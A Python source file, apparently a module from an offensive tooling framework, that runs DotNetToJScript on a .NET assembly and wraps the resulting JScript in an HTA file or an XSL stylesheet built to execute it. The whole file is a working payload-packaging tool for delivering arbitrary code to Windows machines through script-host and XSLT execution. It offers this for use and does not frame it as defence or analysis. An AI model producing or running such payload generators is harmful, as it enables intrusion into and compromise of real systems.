import subprocess
import platform

class dotnettojscript:

    def __init__(self, arguments: dict) -> None:
        self.format = 'hta'
        if 'format' in arguments:
            if arguments['format'] in ['hta', 'js', 'xsl']:
                self.format = arguments['format']
        self.htatemplate = """
<html> 
<head> 
<script language="JScript">
{jscript}
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
"""

        self.xsltemplate = """
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="payload.xsl" ?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:user">
  <msxsl:script language="JScript" implements-prefix="user">
    {jscript}
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec()"/>
  </xsl:template>
</xsl:stylesheet>
"""

    def apply(self, outfile: str) -> None:
        output = 'output.js'
        if platform.system() == 'Linux':
            result = subprocess.run(['mono', 'common/bin/DotNetToJScript.exe', f'{outfile}'], capture_output=True, text=True, check=True)
        else:
            result = subprocess.run(['common/bin/DotNet2JScript.exe', f'{outfile}'], capture_output=True, text=True, check=True)
        jscript = result.stdout
        open('output.js', 'w').write(jscript)
        print('JScript saved to output.js')
        if self.format == 'hta':
            output = 'output.hta'
            formatted = self.htatemplate.format(jscript=jscript)
            open(output, 'w').write(formatted)
            print(f'Output saved to {output}')
        elif self.format == 'xsl':
            output = 'output.xsl'
            formatted = self.xsltemplate.format(jscript=jscript)
            open(output, 'w').write(formatted)
            print(f'Output saved to {output}')
        return output